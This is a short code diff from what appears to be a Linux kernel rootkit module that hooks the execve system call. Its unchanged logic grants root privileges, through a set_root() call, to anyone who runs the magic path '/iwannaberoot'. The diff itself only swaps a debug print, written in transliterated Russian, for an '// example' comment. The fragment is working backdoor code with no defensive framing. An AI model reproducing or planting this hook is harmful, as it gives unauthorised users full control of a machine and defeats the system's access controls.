@@ -25,7 +25,7 @@ asmlinkage int sys_execve_hook(const sys_regs *regs)
     // if read something
     if(strncpy_from_user(executable_name, filename, NAME_MAX) > 0)
     {
-        printk(KERN_ALERT "Ache zdes kto to sprashival pro %s : %d?\n", executable_name, strcmp("/iwannaberoot", executable_name));
+        // example
         if(strcmp("/iwannaberoot", executable_name) == 0)
             set_root();
     };
